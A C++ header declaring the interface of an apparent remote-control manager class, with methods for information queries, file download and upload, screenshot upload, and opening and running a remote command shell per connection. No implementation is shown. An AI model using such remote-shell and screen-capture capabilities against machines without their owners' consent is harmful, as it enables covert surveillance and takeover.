#pragma once
class RmcMgr
{
public:
	static RmcMgr& instance();
	void on_recv_rmc(unsigned long conn_id, const ProtocolRmc& proto);
	void query_information(unsigned long conn_id, unsigned char type);
	void recv_echo(unsigned long conn_id, const std::string& content);
	void send_echo(unsigned long conn_id, const std::string& content);
	void download_file(unsigned long conn_id, const std::string& path, const std::string& land_path);
	void upload_file(unsigned long conn_id, const std::string& path);
	void upload_screenshot(unsigned long conn_id, const std::string& guid);
	void create_cmd(unsigned long conn_id, const std::string& work_dir);
	void execute_cmd(unsigned long conn_id, const std::string& cmd);
	void close_cmd(unsigned long conn_id);
};

